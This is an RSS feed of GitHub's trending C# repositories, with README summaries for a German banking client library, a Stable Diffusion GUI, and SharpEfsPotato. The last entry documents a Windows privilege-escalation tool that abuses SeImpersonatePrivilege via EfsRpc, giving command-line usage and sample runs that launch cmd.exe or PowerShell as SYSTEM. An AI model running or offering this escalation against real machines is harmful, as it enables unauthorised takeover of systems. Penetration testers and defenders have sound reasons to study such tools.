<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-10-20T01:32:19Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>iamtorsten/libfintx</title>
    <updated>2022-10-20T01:32:19Z</updated>
    <id>tag:github.com,2022-10-20:/iamtorsten/libfintx</id>
    <link href="https://github.com/iamtorsten/libfintx" rel="alternate"></link>
    <summary type="html">&lt;p&gt;üè¶ C# based client library for HBCI 2.2, FinTS 3.0, EBICS H004 and EBICS H005.&lt;/p&gt;&lt;hr&gt;&lt;img src=&#34;https://github.com/mrklintscher/libfintx/raw/master/res/logo.png&#34; align=&#34;right&#34;&gt; &#xA;&lt;h1&gt;libfintx&lt;/h1&gt; &#xA;&lt;p&gt;An C# based client library for &lt;strong&gt;HBCI 2.2&lt;/strong&gt;, &lt;strong&gt;FinTS 3.0&lt;/strong&gt;, &lt;strong&gt;EBICS H004&lt;/strong&gt; and &lt;strong&gt;EBICS H005&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;In 1995 the ZKA announced a common online banking standard called &lt;em&gt;Homebanking Computer Interface&lt;/em&gt; (HBCI). In 2003 they published the next generation of this protocol standard and named it &lt;em&gt;Financial Transaction Services&lt;/em&gt; (FinTS).&lt;/p&gt; &#xA;&lt;p&gt;Today most of all german banks support this online banking standards.&lt;/p&gt; &#xA;&lt;p&gt;The Electronic Banking Internet Communication Standard (EBICS) is a German transmission protocol developed by the German Banking Industry Committee for sending payment information between banks over the Internet. It grew out of the earlier BCS-FTAM protocol that was developed in 1995, with the aim of being able to use internet connections and TCP/IP. It is mandated for use by German banks and has also been adopted by France and Switzerland. &lt;a href=&#34;https://en.wikipedia.org/wiki/Electronic_Banking_Internet_Communication_Standard&#34;&gt;Wikipedia&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This client library supports all four APIs, HBCI 2.2, FinTS 3.0 and EBICS H004 and H005.&lt;/p&gt; &#xA;&lt;p&gt;It can be used to read the balance of a bank account, receive an account statement, and make a SEPA payment using &lt;strong&gt;PIN/TAN&lt;/strong&gt; and &lt;strong&gt;EBICS&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;p&gt;There are many reasons why you need to use a banking library which can exchange data from your application with the bank. One reason for example is to found a &lt;a href=&#34;https://de.wikipedia.org/wiki/Finanztechnologie&#34;&gt;Fintech&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Target platforms&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;.NET Standard 2.0&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Sample&lt;/h1&gt; &#xA;&lt;p&gt;Look at the demo projects inside the master branch.&lt;/p&gt; &#xA;&lt;h1&gt;Features&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Get Balance (&lt;strong&gt;HKSAL&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Request Transactions (&lt;strong&gt;HKKAZ&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Transfer money (&lt;strong&gt;HKCCS&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Transfer money at a certain time (&lt;strong&gt;HKCCS&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Collective transfer money (&lt;strong&gt;HKCCM&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Collective transfer money terminated (&lt;strong&gt;HKCME&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Rebook money from one to another account (&lt;strong&gt;HKCUM&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Collect money (&lt;strong&gt;HKDSE&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Collective collect money (&lt;strong&gt;HKDME&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Load mobile phone prepaid card (&lt;strong&gt;HKPPD&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Submit banker&#39;s order (&lt;strong&gt;HKCDE&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Get banker&#39;s orders (&lt;strong&gt;HKCSB&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Send Credit Transfer Initiation (&lt;strong&gt;CCT&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Send Direct Debit Initiation (&lt;strong&gt;CDD&lt;/strong&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Pick up Swift daily statements (&lt;strong&gt;STA&lt;/strong&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Specification&lt;/h1&gt; &#xA;&lt;p&gt;For exact information please refer to the &lt;a href=&#34;http://www.hbci-zka.de/spec/spezifikation.htm&#34;&gt;german version of the specification&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Tested banks&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Raiffeisenbanken&lt;/li&gt; &#xA; &lt;li&gt;Sparkassen&lt;/li&gt; &#xA; &lt;li&gt;DKB&lt;/li&gt; &#xA; &lt;li&gt;DiBa&lt;/li&gt; &#xA; &lt;li&gt;Consorsbank&lt;/li&gt; &#xA; &lt;li&gt;Sparda&lt;/li&gt; &#xA; &lt;li&gt;Postbank&lt;/li&gt; &#xA; &lt;li&gt;Norisbank&lt;/li&gt; &#xA; &lt;li&gt;Deutsche Bank&lt;/li&gt; &#xA; &lt;li&gt;Unicredit Bank&lt;/li&gt; &#xA; &lt;li&gt;Commerzbank&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Sample code&lt;/h1&gt; &#xA;&lt;p&gt;Check account balance.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;/// &amp;lt;summary&amp;gt;&#xA;/// Kontostand abfragen&#xA;/// &amp;lt;/summary&amp;gt;&#xA;/// &amp;lt;param name=&#34;sender&#34;&amp;gt;&amp;lt;/param&amp;gt;&#xA;/// &amp;lt;param name=&#34;e&#34;&amp;gt;&amp;lt;/param&amp;gt;&#xA;private async void btn_kontostand_abfragen_Click(object sender, EventArgs e)&#xA;{&#xA;    var connectionDetails = GetConnectionDetails();&#xA;    var client = new FinTsClient(connectionDetails);&#xA;    var sync = await client.Synchronization();&#xA;&#xA;    HBCIOutput(sync.Messages);&#xA;&#xA;    if (sync.IsSuccess)&#xA;    {&#xA;        // TAN-Verfahren&#xA;        client.HIRMS = txt_tanverfahren.Text;&#xA;&#xA;        if (!await InitTANMedium(client))&#xA;            return;&#xA;&#xA;        var balance = await client.Balance(_tanDialog);&#xA;&#xA;        HBCIOutput(balance.Messages);&#xA;&#xA;        if (balance.IsSuccess)&#xA;            SimpleOutput(&#34;Kontostand: &#34; + Convert.ToString(balance.Data.Balance));&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;SSL verification&lt;/h1&gt; &#xA;&lt;p&gt;The verification process is done by using the default &lt;a href=&#34;https://msdn.microsoft.com/de-de/library/system.net.webrequest(v=vs.110).aspx&#34;&gt;&lt;strong&gt;WebRequest&lt;/strong&gt;&lt;/a&gt; class.&lt;/p&gt; &#xA;&lt;h1&gt;Limitations&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Usage with certificates has been prepared but not completely implemented yet. It works with private/public keys.&lt;/li&gt; &#xA; &lt;li&gt;Only version A005 for signatures can be used. A006 uses PSS padding, which is currently not supported by .NET Core 2.x. Bouncy Castle is only used for PEM file and certificate management.&lt;/li&gt; &#xA; &lt;li&gt;Only version E002 for encryption can be used.&lt;/li&gt; &#xA; &lt;li&gt;Only version X002 for authentication can be used.&lt;/li&gt; &#xA; &lt;li&gt;It was developed using EBICS Version H004, but H005 should work.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Copyright &amp;amp; License&lt;/h1&gt; &#xA;&lt;p&gt;Copyright (c) 2016 - 2022 &lt;strong&gt;Torsten Klinger&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Licensed under &lt;strong&gt;GNU LESSER GENERAL PUBLIC LICENSE Version 3, 29 June 2007&lt;/strong&gt;. Please read the LICENSE file.&lt;/p&gt; &#xA;&lt;h1&gt;Support&lt;/h1&gt; &#xA;&lt;p&gt;You can contact me via &lt;a href=&#34;mailto:torsten.klinger@googlemail.com&#34;&gt;E-Mail&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>n00mkrad/text2image-gui</title>
    <updated>2022-10-20T01:32:19Z</updated>
    <id>tag:github.com,2022-10-20:/n00mkrad/text2image-gui</id>
    <link href="https://github.com/n00mkrad/text2image-gui" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Somewhat modular text2image GUI, initially just for Stable Diffusion&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;NMKD Stable Diffusion GUI&lt;/h1&gt; &#xA;&lt;p&gt;Somewhat modular text2image GUI, initially just for Stable Diffusion.&lt;/p&gt; &#xA;&lt;p&gt;Relies on a slightly customized fork of the InvokeAI Stable Diffusion code (formerly lstein): &lt;a href=&#34;https://github.com/n00mkrad/stable-diffusion-cust/commits/main&#34;&gt;Code Repo&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;System Requirements&lt;/h2&gt; &#xA;&lt;h4&gt;Minimum:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;GPU:&lt;/strong&gt; Nvidia GPU with 4 GB VRAM, Maxwell Architecture (2014) or newer&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;RAM:&lt;/strong&gt; 8 GB RAM (Note: Pagefile must be enabled as swapping will occur with only 8 GB!)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Disk:&lt;/strong&gt; 12 GB (another free 2 GB for temporary files recommended)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Recommended:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;GPU:&lt;/strong&gt; Nvidia GPU with 8 GB VRAM, Pascal Architecture (2016) or newer&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;RAM:&lt;/strong&gt; 16 GB RAM&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Disk:&lt;/strong&gt; 12 GB on SSD (another free 2 GB for temporary files recommended)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Professional/DreamBooth-capable:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;GPU:&lt;/strong&gt; Nvidia GPU with 24GB VRAM, Turing Architecture (2018) or newer&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;RAM:&lt;/strong&gt; 32 GB RAM&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Disk:&lt;/strong&gt; 12 GB on NVME SSD (another free 25 GB for temporary files recommended)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Features and How to Use Them&lt;/h2&gt; &#xA;&lt;h3&gt;Prompt Input&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Multiple prompts at once:&lt;/strong&gt; Enter each prompt on a new line (newline-separated). Word wrapping does not count towards this.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Exclusion Words:&lt;/strong&gt; Put words or phrases into [square brackets] to tell the AI to exclude those things when generating images.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Emphasis:&lt;/strong&gt; Use (parentheses) to make a word/phrase more impactful, or {curly brackets} to do the opposite. You can also use ((multiple)).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Additional Inputs&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Load Image:&lt;/strong&gt; Load an initialization image that will be used together with your text prompt (&#34;img2img&#34;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Load Concept:&lt;/strong&gt; Load a Textual Inversion concept to apply a style or use a specific character&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Stable Diffusion Settings&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Steps:&lt;/strong&gt; More steps can increase detail, but only to a certain extend. Depending on the sampler, 20-60 is a good range.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Has a linear performance impact: Doubling the step count means each image takes twice as long to generate.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Prompt Guidance (CFG Scale):&lt;/strong&gt; Lower values are closer to the raw output of the AI, higher values try to respect your prompt more accurately.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Use low values if you are happy with the AI&#39;s representation of your prompt. Use higher values if not - but going too high will degrade quality.&lt;/li&gt; &#xA;   &lt;li&gt;No performance impact, no matter the value.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Seed:&lt;/strong&gt; Starting value for the image generation. Allows you to create the exact same image again by using the same seed.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;When using the same seed, the image will only be identical if you also use the same sampler and resolution (and other settings).&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Resolution:&lt;/strong&gt; Adjust image size. Only values that are divisible by 64 are possible. Sizes above 512x512 can lead to repeated patterns.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Higher resolution images require more VRAM and are slower to generate.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Sampler:&lt;/strong&gt; Changes the way images are sampled. Euler Ancestral is the default because it&#39;s fast and tends to look good even with few steps.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Generate Seamless Images:&lt;/strong&gt; Generates seamless/tileable images, very useful for making game textures or repeating backgrounds.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Image Viewer&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Review current images:&lt;/strong&gt; Use the scroll wheel while hovering over the image to go to the previous/next image.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Slideshow:&lt;/strong&gt; The image viewer always shows the newest generated image if you haven&#39;t manually changed it in the last 3 seconds.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Context Menu:&lt;/strong&gt; Right-click into the image area to show more options.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Pop-Up Viewer:&lt;/strong&gt; Click into the image area to open the current image in a floating window. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Use the mouse wheel to change the window&#39;s size (zoom), right-click for more options, double-click to toggle fullscreen.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Settings Button (Top Bar)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Low Memory Mode:&lt;/strong&gt; Use &#34;optimizedSD&#34; implementation that is very slow, but requires less VRAM. Not recommended unless you need it.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Use Full Precision:&lt;/strong&gt; Use FP32 instead of FP16 math, which requires more VRAM but can fix certain compatibility issues.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Unload Model After Each Generation:&lt;/strong&gt; Completely unload Stable Diffusion after images are generated.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Stable Diffusion Model File:&lt;/strong&gt; Select the model file to use for image generation. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Included models are located in &lt;code&gt;Data/models&lt;/code&gt;. You can add more folder paths by clicking on &#34;Folders...&#34;.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CUDA Device:&lt;/strong&gt; Allows your to specify the GPU to run the AI on, or set it to run on the CPU (very slow).&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Image Output Folder:&lt;/strong&gt; Set the folder where your generated images will be saved.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Create a Subfolder for Each Prompt:&lt;/strong&gt; If enabled, images will be saved in a folder named after their prompt.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Metadata to Include in Filename:&lt;/strong&gt; Specify which information should be included in the filename.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;When Running Multiple Prompts, Use Same Starting Seed for All of Them:&lt;/strong&gt; If enabled, the seed resets to the starting value for every new prompt. If disabled, the seed will be incremented by 1 after each iteration, being sequential until all prompts/iterations have been generated.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;When Post-Processing Is Enabled, Also Save Un-Processed Image:&lt;/strong&gt; When enabled, both the &#34;raw&#34; and the post-processed image will be saved.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Advanced Mode:&lt;/strong&gt; Increases the limits of the sliders in the main window. Not very useful most of the time unless you really need those high values.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Notify When Image Generation Has Finished:&lt;/strong&gt; Play a sound, show a notification, or do both if image generation finishes in background.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Logs Button (Top Bar)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Open Logs Folder:&lt;/strong&gt; Opens the log folder of the current session. The application deletes logs older than 3 days on every startup.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Copy &amp;lt;logname&amp;gt;.txt&lt;/strong&gt;: Copy one of the log files generated in the current session to clipboard.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Installer Button (Top Bar)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Installation Status:&lt;/strong&gt; Shows which modules are installed (checkboxes are not interactive and only indicate if a module is installed correctly!).&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Redownload SD Model:&lt;/strong&gt; Re-downloads Stable Diffusion 1.4 model (4 GB) from Google Storage servers.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Re-Install SD Code:&lt;/strong&gt; Re-installs the Stable Diffusion code from its repository. Can fix some issues related to file paths.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Re-Install Upscalers:&lt;/strong&gt; (Re-)Installs upscaling files (RealESRGAN, GFPGAN, CodeFormer, including model files).&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;(Re-)Install:&lt;/strong&gt; Installs everything. Skips already installed components.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Uninstall:&lt;/strong&gt; Removes everything except for Conda which is included and needed for a re-installation.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Developer Tools Button (Top Bar)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Open Dream.py CLI:&lt;/strong&gt; Use Stable Diffusion in command-line interface&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Merge Models:&lt;/strong&gt; Allows you to merge/blend two models. The percentage numbers represent their respective weight.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Prune Models:&lt;/strong&gt; Allows you to reduce the size of models by removing data that&#39;s not needed for image generation.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;View Log In Realtime:&lt;/strong&gt; Opens a separate window that shows all log output, including messages that are not shown in the normal log box.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Train DreamBooth Model:&lt;/strong&gt; Allows you to train a model on a specific object or character using only a few images of it. (Guide)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Post-Processing Button (Top Bar)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Upscaling:&lt;/strong&gt; Set RealESRGAN upscaling factor.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Face Restoration:&lt;/strong&gt; Enable GFPGAN or CodeFormer for face restoration.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Bottom Bar Buttons&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Generate:&lt;/strong&gt; Start AI image generation (or cancel if it&#39;s already running).&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Prompt Queue Button:&lt;/strong&gt; Right-click to add the current settings to the queue, or left-click to manage the queued entries.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Prompt History Button:&lt;/strong&gt; View recent prompts, load them into the main window, search or clear history, or disable it.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Image Deletion Button:&lt;/strong&gt; Delete either the image that is being viewed currently, or all images from the current batch.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Open Folder Button:&lt;/strong&gt; Opens the (root) image output folder.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Left/Right Buttons:&lt;/strong&gt; Show the previous or next image from the current batch.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Hotkeys (Main Window)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTRL+G:&lt;/strong&gt; Run Image Generation (or Cancel if already running)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTRL+M:&lt;/strong&gt; Show Model Quick Switcher (Once it&#39;s open, use ESC to Cancel or Enter to confirm)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTRL+PLUS:&lt;/strong&gt; Toggle Prompt Textbox Size&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTLR+DEL:&lt;/strong&gt; Delete currently viewed image&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTRL+SHIFT+DEL:&lt;/strong&gt; Delete all generated images (of the current batch)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTRL+O:&lt;/strong&gt; Open currently viewed image&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTRL+SHIFT+O:&lt;/strong&gt; Show current image in its folder&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTRL+V:&lt;/strong&gt; Paste Image (If clipboard contains a bitmap)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTRL+Q:&lt;/strong&gt; Quit&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CTRL+Scroll:&lt;/strong&gt; Change font size (only while mouse is over prompt text field)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;F1:&lt;/strong&gt; Open Help (Currently links to GitHub Readme)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;F12:&lt;/strong&gt; Open Settings&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>bugch3ck/SharpEfsPotato</title>
    <updated>2022-10-20T01:32:19Z</updated>
    <id>tag:github.com,2022-10-20:/bugch3ck/SharpEfsPotato</id>
    <link href="https://github.com/bugch3ck/SharpEfsPotato" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Local privilege escalation from SeImpersonatePrivilege using EfsRpc.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SharpEfsPotato&lt;/h1&gt; &#xA;&lt;p&gt;Local privilege escalation from SeImpersonatePrivilege using EfsRpc.&lt;/p&gt; &#xA;&lt;p&gt;Built from SweetPotato by @&lt;em&gt;EthicalChaos&lt;/em&gt; and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;SharpEfsPotato.exe -h&#xA;SharpEfsPotato by @bugch3ck&#xA;  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.&#xA;&#xA;  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.&#xA;&#xA;  -p, --prog=VALUE           Program to launch (default cmd.exe)&#xA;  -a, --args=VALUE           Arguments for program (default null)&#xA;  -h, --help                 Display this help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;h3&gt;Default behavior: Start cmd.exe as system in a separate process (in separate console)&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;SharpEfsPotato.exe&#xA;SharpEfsPotato by @bugch3ck&#xA;  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.&#xA;&#xA;  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.&#xA;&#xA;[+] Triggering name pipe access on evil PIPE \\localhost/pipe/44259a4a-cbea-499b-9dc5-a9b1c13a4b9f/\44259a4a-cbea-499b-9dc5-a9b1c13a4b9f\44259a4a-cbea-499b-9dc5-a9b1c13a4b9f&#xA;df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:&#xA;[x]RpcBindingSetAuthInfo failed with status 0x6d3&#xA;[+] Server connected to our evil RPC pipe&#xA;[+] Duplicated impersonation token ready for process creation&#xA;[+] Intercepted and authenticated successfully, launching program&#xA;[+] Process created, enjoy!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Specify PowerShell binary and arguments&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a &#34;whoami | Set-Content C:\temp\w.log&#34;&#xA;SharpEfsPotato by @bugch3ck&#xA;  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.&#xA;&#xA;  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.&#xA;&#xA;[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2&#xA;df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:&#xA;[x]RpcBindingSetAuthInfo failed with status 0x6d3&#xA;[+] Server connected to our evil RPC pipe&#xA;[+] Duplicated impersonation token ready for process creation&#xA;[+] Intercepted and authenticated successfully, launching program&#xA;[+] Process created, enjoy!&#xA;&#xA;C:\temp&amp;gt;type C:\temp\w.log&#xA;nt authority\system&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>